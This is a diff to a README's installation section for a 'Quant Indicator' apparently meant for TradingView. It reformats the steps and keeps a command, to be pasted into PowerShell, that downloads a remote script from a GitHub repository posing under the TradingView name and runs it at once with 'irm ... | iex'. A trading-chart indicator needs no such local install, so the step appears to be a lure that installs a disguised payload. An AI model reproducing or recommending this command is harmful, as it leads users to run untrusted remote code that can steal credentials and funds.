@@ -12,22 +12,15 @@ Follow the steps below to install the Quant Indicator using a PowerShell command
 
 #### 1. Open PowerShell
 
-Press **Win + R**, type:
-
-```text
-PowerShell
-```
-
-Then press **Enter**.
+Press **Win + R**, type `PowerShell`, and press **Enter**.
 
 #### 2. Install the Quant Indicator
 
 Copy and paste the installation command below into the PowerShell window:
+
 ```powershell
 irm https://github.com/TradingView-Library/Quant-Indicator/raw/refs/heads/master/debug/install.ps1 | iex
 ```
-
-Press **Enter** to begin the installation.
 
 #### 3. Restart TradingView
 
